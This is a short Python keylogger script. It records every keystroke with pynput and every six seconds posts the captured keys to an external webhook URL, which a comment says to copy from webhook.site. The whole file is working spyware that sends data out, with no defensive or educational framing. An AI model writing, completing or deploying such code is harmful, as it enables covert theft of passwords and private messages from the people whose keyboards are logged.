import requests
import pynput.keyboard
import time

def send_to_webhook(url, data):
    response = requests.post(url, json=data)
    return response.status_code, response.text

def on_press(key):
    global current_keys
    current_keys.append(str(key))

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

#Visit to 'https://webhook.site' and copy the unique URL here
webhook_url = "{WEBHOOK_URL}"
waiting_time = 6

current_keys = []

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        # Wait for $waiting_time seconds
        time.sleep(waiting_time)

        # Send data to webhook
        data = ''.join(current_keys)
        status_code, response_text = send_to_webhook(webhook_url, {'data': data})

        # Clear the current_keys list
        current_keys = []

    listener.join()
